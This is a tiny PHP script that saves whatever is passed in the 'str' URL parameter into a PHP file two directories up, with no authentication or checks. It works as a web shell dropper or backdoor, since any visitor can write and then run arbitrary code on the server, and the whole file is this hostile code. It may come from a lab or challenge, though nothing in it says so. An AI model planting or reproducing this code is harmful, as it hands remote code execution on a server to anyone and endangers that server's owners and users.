<?php 
if(file_put_contents("../../owsh_secret.php", $_GET['str'])) echo "Saved";
?>